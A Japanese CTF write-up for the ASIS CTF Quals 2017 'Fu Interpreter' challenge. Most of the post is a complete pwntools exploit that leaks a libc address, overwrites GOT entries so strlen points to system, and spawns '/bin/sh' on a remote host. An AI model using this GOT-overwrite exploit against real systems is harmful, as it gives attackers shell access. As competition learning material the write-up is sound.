---
layout: post
redirect_from:
  - /blog/2017/04/10/asis-ctf-quals-2017-fu-interpreter/
date: "2017-04-10T02:45:32+09:00"
tags: [ "ctf", "writeup", "asis-ctf", "pwn" ]
"target_url": [ "https://asis-ctf.ir/challenges/" ]
---

# ASIS CTF Quals 2017: Fu Interpreter

<http://pwnable.kr> でやった。

## problem

brainfuckっぽい謎処理系。

## solution

data pointerをGOT上まで動かして書き換え。
x86なのでone-gadget RCEはだめ。
`putchar`を`main`に書き換え、`strlen`を`system`に書き換える。
再度の`fgets`からの`strlen`で発火。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='69.90.132.40')
parser.add_argument('port', nargs='?', default=4001, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='fulang')
parser.add_argument('--libc', default='libc6-i386_2.23-0ubuntu7_amd64.so')
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)
libc = ELF(args.libc)
p = remote(args.host, args.port)
# p = process(args.binary)

# 0x0003ada0 libc.system
# 0x00075410 libc.strlen
# 0x080486de main
# 0x0804a01c got.puts
# 0x0804a020 got.strlen
# 0x0804a02c got.putchar
# 0x0804a060 obj.fu
# 0x0804a080 *obj.fu
code = ''
code += '(' # use puts
code += '<' * 0x20 # move fu onto itself
code += '.' * 1 # obj.fu = got.puts
code += ':>:>:>:>' # send got.puts
code += '.>.>.>.>' # got.strlen = system
code += '>>>>>>>>'
code += '.>.>.>.>' # got.putchar = { fgets(code, n, stdin); strlen(code); }
code += ':' # use putchar
code = ''.join(map(lambda c: ':' + c, code))
assert len(code) < 150
p.recvuntil('Enter your code:')
p.sendline(code)
assert p.recvline() == 'Not implemented yet!\n'
p.send(chr(0x1c)) # got.puts
puts = u32(p.recvn(4))
log.info('puts: %#x', puts)
libc_base = puts - libc.symbols['puts']
log.info('libc base: %#x', libc_base)
system = libc_base + libc.symbols['system']
log.info('system: %#x', system)
p.send(p32(system)) # libc.system
p.send(p32(0x80486de)) # main
p.sendline('/bin/sh')

time.sleep(1)
p.sendline('id')
p.interactive()
```
